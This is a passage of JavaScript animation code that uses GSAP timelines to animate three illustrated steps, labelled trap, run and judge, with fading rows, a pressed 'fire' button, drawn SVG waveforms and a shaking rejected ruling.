  /* 04 — the bench is armed, then the trigger is pulled. Once. */
  trap: (viz) => {
    const s = gsap.utils.selector(viz);
    const fire = s("[data-fire]")[0];
    return gsap
      .timeline()
      .from(s("[data-t-row]"), { opacity: 0, x: -14, duration: 0.4, stagger: 0.22, ease: "power3.out" })
      .from(fire, { opacity: 0, y: 8, duration: 0.35, ease: "power2.out" }, "+=0.1")
      .to(fire, { y: 2, duration: 0.09, ease: "power2.in" }, "+=0.35")
      .add(() => fire.classList.add("is-fired"))
      .to(fire, { y: 0, duration: 0.16, ease: "power2.out" })
      .fromTo(
        fire,
        { boxShadow: "0 0 0 0 color-mix(in srgb, var(--ng-danger) 40%, transparent)" },
        { boxShadow: "0 0 0 16px transparent", duration: 0.7, ease: "power2.out" },
        "-=0.16",
      );
  },

  /* 05 — four recorders write at once, for as long as it runs. */
  run: (viz) => {
    const s = gsap.utils.selector(viz);
    gsap.set(s("[data-r-wave]"), { drawSVG: "0%" });
    return gsap
      .timeline()
      .to(s("[data-r-wave]"), { drawSVG: "100%", duration: 1.5, stagger: 0.12, ease: "none" })
      .add(() =>
        gsap.to(s("[data-r-live]"), {
          opacity: 0.35,
          duration: 0.9,
          repeat: -1,
          yoyo: true,
          ease: "power1.inOut",
        }),
      );
  },

  /* 06 — the ruling that cites nothing is thrown out. */
  judge: (viz) => {
    const s = gsap.utils.selector(viz);
    return gsap
      .timeline()
      .from(s("[data-j-bad]"), { opacity: 0, y: 10, duration: 0.4, ease: "power2.out" })
      .to(s("[data-j-bad]"), { x: -4, duration: 0.07, repeat: 5, yoyo: true, ease: "none" }, "+=0.35")
      .to(s("[data-j-bad]"), { opacity: 0.45, duration: 0.3 }, "-=0.1")
      .from(s("[data-j-good]"), { opacity: 0, y: 12, duration: 0.45, ease: "power2.out" }, "+=0.15")
      .from(s("[data-j-cite]"), { opacity: 0, y: -8, duration: 0.3, stagger: 0.13, ease: "back.out(2)" }, "-=0.1")
      .fromTo(
        s("[data-j-stamp]"),
        { borderWidth: 1 },
        { borderWidth: 2, duration: 0.42, ease: "power1.inOut" },
        "-=0.2",
      );
  },
};
